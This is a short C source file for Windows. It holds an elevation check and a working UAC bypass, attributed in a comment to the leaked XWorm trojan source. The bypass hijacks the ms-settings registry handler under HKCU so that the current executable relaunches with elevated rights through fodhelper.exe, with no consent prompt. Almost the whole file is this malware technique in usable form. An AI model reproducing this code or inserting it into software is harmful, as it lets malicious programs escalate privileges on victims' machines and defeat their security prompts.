#include <Windows.h>
#include <Psapi.h>

unsigned long IsElevated(void)
{
	unsigned long IsElevated = 0;
	unsigned long BytesReturned = 0;

	GetTokenInformation(GetCurrentProcessToken(), TokenElevation, &IsElevated, sizeof(IsElevated), &BytesReturned);
	return IsElevated;
}

// References:
// XWorm V5.6 source code leak w/ UAC plugin binary (reverse engineered w/ dnSpy) (https://github.com/sqrtZeroKnowledge/XWorm-Trojan)
char BypassUAC(char* pOriginalPath)
{
	HKEY hKey = 0;
	char pFileName[2048] = { 0 };

	memset(pFileName, 0, sizeof(pFileName));

	if (RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", &hKey))
	{
		return 1;
	}

	if (!GetModuleFileNameA(0, pFileName, sizeof(pFileName)))
	{
		return 1;
	}

	strcat_s(pFileName, sizeof(pFileName), " ");
	strcat_s(pFileName, sizeof(pFileName), pOriginalPath);

	if (RegSetValueExA(hKey, "", 0, REG_SZ, pFileName, sizeof(pFileName)))
	{
		return 1;
	}
	if (RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, "", (unsigned long)strlen("") + 1))
	{
		return 1;
	}

	system("C:\\Windows\\System32\\cmd.exe /C start C:\\Windows\\System32\\fodhelper.exe & exit");

	return 0;
}